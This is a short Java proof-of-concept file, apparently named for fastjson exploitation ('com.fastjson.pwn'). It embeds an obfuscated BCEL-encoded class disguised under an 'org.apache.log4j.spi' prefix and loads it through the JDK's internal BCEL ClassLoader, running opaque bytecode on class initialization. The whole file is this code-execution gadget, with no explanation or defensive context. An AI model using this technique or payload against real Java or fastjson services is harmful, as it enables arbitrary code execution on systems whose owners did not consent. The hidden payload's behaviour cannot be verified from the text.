package com.fastjson.pwn;

public class pwntest {
	
	public static void main(String[] args) throws Exception {
		String classname = "org.apache.log4j.spi$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmP$cbJ$c3$40$U$3d$d3G$s$89$a9$ad$ad$f5$fd$c0$85$d0$ba0$hw$znDWA$85J$f7$d38$d4$vyH2$v$f8Y$baPp$e1$H$f8Q$e2$9dX$c4$823p$P$f7$9c$7b$ce$5c$e6$f3$eb$fd$D$c0$Z$O$5dXXs$d0F$c7$c6$ba$8b$$6869$b6$Y$ac$a1J$94$3eg$a8$f6$fac$86$daEz$_$Z$9a$81J$e4u$ROdv$t$s$R1$ed$m$NE4$W$992$fd$82$ac$e9$H$95$9b$e90$8d$7d$zs$ed_$ceU4$60$b0$87a$b4$c8uGi$91$85$f2J$Z$83c$f4$d3$99$98$L$P$i6$c7$b6$87$j$ec$d2$ebB$I$8e$3d$P$fb8$60h$y$e51$b4$8c$c3$8fD2$f5o$s3$Z$ea$rj$f4$94k$ZSFZ$90$d0$NJE$a5$fem$a6$S$3d$d2$99$U1$ad$d4$f9$87f$e0$8f$a6$8b$S$f2$f5$82$3f$91$9a$e8$e9$a0$3f$c6$R$ea$f4w$e6T$c0$cc$ceT$j$ea$7cBFX$3fy$D$7b$$e$97$aaU$92$WV$a8z$3f$D$84$NB$h$ab$bf$e6c$9a6$c7yA$a5$5d$7dE$cd$E$b02$c0$z$r$9b$aeCL$b3$Mn$7d$DS$c5$9b$85$c9$B$A$A";
		ClassLoader cls = new com.sun.org.apache.bcel.internal.util.ClassLoader();
		Class.forName(classname, true, cls);
		
	}
}
